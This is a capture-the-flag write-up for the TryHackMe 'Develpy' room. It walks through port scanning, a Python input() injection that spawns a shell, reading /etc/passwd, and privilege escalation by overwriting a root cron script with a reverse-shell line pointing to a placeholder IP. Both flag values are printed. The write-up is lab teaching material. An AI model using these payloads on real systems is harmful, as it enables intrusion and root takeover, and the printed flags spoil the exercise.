---
{"dg-publish":true,"permalink":"/try-hack-me-rooms/develpy/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-23T15:21:53.438+02:00","updated":"2026-04-23T19:35:15.353+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
---


![](/img/user/Attachments/redteaming2.png)

--------
## Description

This room demonstrates vulnerabilities in: 
1. System functions not sanitizing user input
2. Sensitive system backend exposed via the frontend
3. cronjobs not secured by having proper file permissions


---------
## Recon

As always a full nmap scan is required to discover running services and active ports on the system. 

![](/img/user/Attachments/nmap%203.png)

Once the running ports and services are discovered we move forward to enumerating the identified services and ports. 

![](/img/user/Attachments/nma2p.png)


-------
## Enumeration

![](/img/user/Attachments/homepage%202.png)

So, right off the bat it is confirmed that this HTTP service is running on a non-standard port and that python is running on the system. Nothing much is revealed by visiting the page running on port 10000 and it is running a specific compatibility mode meaning not much is revealed via DevTools either. 

From the Nmap scan it is revaled that nmap had a hard time identifying the services. All that is shown for sure is a HTTP service running on non-standard port, SSH, and some other custom services. A good approach here is to use **Netcat** to determine what type of *data* is being sent back so let's communicate with the system.

```bash
nc TARGET 10000
```

This command allows us to connect and the python script is being executed as the system is prompting us for input. Trial and error reveals basically the scenario displayed on the front-end. So, essentially Command Injection can be used here to spawn a shell. 


-----
## Exploitation

![](/img/user/Attachments/shell.png)

**Payload to Spawn a Shell**
```bash
__import__('pty').spawn("/bin/bash")
```

The vulnerability arises given that the **input()** function allows for command injection given that the function interprets the input. 

----
## Post-exploitation

```bash
cat /etc/passwd | grep /home
```

```bash
syslog:x:104:108::/home/syslog:/bin/false  
king:x:1000:1000:develpy,,,:/home/king:/bin/bash
```

-----
### Retrieving First Flag in Home Directory

```bash
cat /home/king
```

So a user **king** exist on the system. Let's check out his home directory

![](/img/user/Attachments/kinghome.png)


**user.txt flag** `cf85ff769cfaaa721758949bf870b019`

And the first flag is retrieved.

-----
### Moving on to root flag

In king's home directory there are a few scripts to check out. 

**Checking out the run.sh script**
```bash
#!/bin/bash  
kill cat /home/king/.pid  
socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0 &  
echo $! > /home/king/.pid
```

So this script ensures that for each new connection the **exploit.py** script runs and that the input given to the webapp will be handled and specifies some criteria for the use of the address running on port 10000 and also kills the last running instance before running the script again.  This might not be that interesting for privesc.

**Looking to the root.sh**

```bash
python /root/company/media/*.py
```

Here it is confirmed that whichever python files exist in this directory will be executed. First thought would be to attempt to see if spawning a root shell here is possible by placing a python script in the directory. 

![](/img/user/Attachments/crontab%201.png)

Looking at the cronjobs it is seen that 3 cronjobs run every minute. 1 of which is the directory of interest for privilege escalation. 

**Payload to Spawn Reverse Shell**
```bash
# delete the root.sh
rm root.sh

# create the file again with the shell
echo 'bash -i /dev/tcp/IP/PORT 0>&1' > root.sh

# make it executable
chmod +x root.sh

# spawn a nc connection 
nc 4444

# wait 1 minute for the shell to spawn 
```

![](/img/user/Attachments/rootshell.png)

**Flag is retrieved:** `9c37646777a53910a347f387dce025ec` in the root home directory 



------
## Attack Pattern Analysis (APA)

nmap > webpage on non-standard port > enumerate with nc > use python code injection for shell > check crontab for cronjobs > delete root.sh and recreate it spawning a root shell > root flag 